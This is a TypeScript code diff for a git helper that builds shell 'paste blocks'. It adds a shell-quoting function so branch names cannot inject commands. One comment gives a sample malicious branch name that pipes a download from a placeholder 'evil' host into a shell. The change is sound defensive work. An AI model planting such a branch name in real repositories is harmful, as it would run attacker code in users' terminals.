@@ -22,6 +22,14 @@ export function targetName(b: PlanBlock): string {
   return b.onto ?? b.base.ref ?? b.base.sha.slice(0, 7);
 }
 
+// single-quote a value for a POSIX shell: git allows shell metacharacters
+// in branch names (a repo could hold a branch named `x;curl evil|sh`), and
+// the paste block is run in the user's terminal, so every ref we emit is
+// quoted, embedded quotes escaped, so it can never break out of its argument
+export function shq(s: string): string {
+  return `'${s.replace(/'/g, "'\\''")}'`;
+}
+
 // a heredoc delimiter that appears in none of the texts as a whole line
 export function delimiter(texts: string[]): string {
   const lines = new Set(texts.flatMap((t) => t.split("\n").map((l) => l.trim())));
@@ -96,13 +104,13 @@ export function paste(b: PlanBlock): string[] {
       .filter((r) => r.action !== "drop")
       .map((r) => r.sha);
     if (!shas.length) return out;
-    out.push(`git switch ${b.onto}`, `git cherry-pick -x ${shas.join(" ")}`);
+    out.push(`git switch ${shq(b.onto ?? "")}`, `git cherry-pick -x ${shas.join(" ")}`);
     return out;
   }
   const t = todo(b);
   const dir = files(b);
   const eof = delimiter([...t.texts, ...t.lines]);
-  if (b.head) out.push(`git switch ${b.head}`);
+  if (b.head) out.push(`git switch ${shq(b.head)}`);
   else out.push("# check out the branch that holds these commits first");
   t.texts.forEach((text, i) => {
     out.push(`cat > ${dir}-msg-${i + 1} <<'${eof}'`, text, eof);
